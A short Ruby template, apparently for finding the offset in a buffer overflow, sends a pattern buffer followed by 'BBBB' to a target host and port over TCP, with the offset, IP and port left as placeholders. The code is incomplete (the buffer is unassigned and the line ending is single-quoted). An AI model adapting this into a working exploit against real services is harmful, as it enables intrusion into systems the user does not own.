buff = #Based on the offset bytes, place your pattern here 
buff += "B" * 4
RHOST = #IP address of the target machine, example: "10.10.10.0"
RPORT = #Port number of the target machine, example: 21

require 'socket'

TCPSocket.open(RHOST,RPORT){ |s| s.puts buff + '\r\n'}
